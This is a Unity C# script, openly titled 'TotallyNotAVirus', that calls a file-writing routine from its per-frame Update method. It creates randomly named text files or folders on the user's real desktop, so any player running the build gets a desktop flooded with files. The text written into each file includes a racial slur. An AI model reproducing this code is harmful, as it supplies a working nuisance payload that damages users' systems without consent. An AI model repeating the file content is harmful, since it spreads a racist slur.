using System.Collections;
using System.Collections.Generic;
using System.IO;
using UnityEngine;

public class TotallyNotAVirus : MonoBehaviour
{
    [Tooltip("List of possible file/folder names (without extensions)")]
    public List<string> possibleNames = new List<string>();

    [Tooltip("Number of files/folders to create")]
    public int numberOfItemsToCreate = 1;

    [Tooltip("Should create files (otherwise creates folders)")]
    public bool createFiles = true;

    [Tooltip("File extension to use (if creating files)")]
    public string fileExtension = ".txt";

    [Tooltip("Should include a random number in the name")]
    public bool includeRandomNumber = true;


    private void Update()
    {
        CreateRandomFilesOnDesktop();
    }

    private void Start()
    {
        
    }




    // Creates files or folders on the desktop with random names from the list
    public void CreateRandomFilesOnDesktop()
    {
        if (possibleNames.Count == 0)
        {
            Debug.LogError("No possible names provided in the list!");
            return;
        }

        string desktopPath = System.Environment.GetFolderPath(System.Environment.SpecialFolder.Desktop);

        for (int i = 0; i < numberOfItemsToCreate; i++)
        {
            string randomName = possibleNames[Random.Range(0, possibleNames.Count)];

            if (includeRandomNumber)
            {
                randomName += "_" + Random.Range(1, 1000);
            }

            string fullPath = Path.Combine(desktopPath, randomName + (createFiles ? fileExtension : ""));

            try
            {
                if (createFiles)
                {
                    File.WriteAllText(fullPath, "Hasnain is the Final Boss Of The Deserted Island named 'Nigga Chad Land'!");
                    Debug.Log("Created file: " + fullPath);
                }
                else
                {
                    Directory.CreateDirectory(fullPath);
                    Debug.Log("Created folder: " + fullPath);
                }
            }
            catch (System.Exception e)
            {
                Debug.LogError("Failed to create item: " + e.Message);
            }
        }
    }
}